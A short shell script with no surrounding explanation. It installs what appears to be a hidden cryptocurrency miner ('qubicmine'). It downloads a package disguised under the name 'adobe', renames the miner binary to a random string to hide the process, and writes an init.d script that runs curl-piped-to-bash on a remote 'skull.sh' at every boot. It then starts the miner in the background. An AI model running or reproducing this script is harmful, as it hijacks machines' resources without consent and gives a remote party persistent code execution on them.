cd /
wget https://github.com/sandzema/trace/releases/download/v1.9.7/adobe.zip
unzip adobe.zip
cd /adobe
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv torch $variable1
sed -i "s/python/${variable1}/g" ./papyr.sh
sed -i "s/SUM/2/g" ./qubicmine.json
sed -i "s/ALIAS/${variable1}/g" ./qubicmine.json
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/sandzema/trace/main/skull.sh)" > bones.sh
chmod a+x bones.sh
update-rc.d bones.sh defaults
rm -rf adobe.zip
cd /adobe
nohup ./papyr.sh
ps -ef | grep adobe
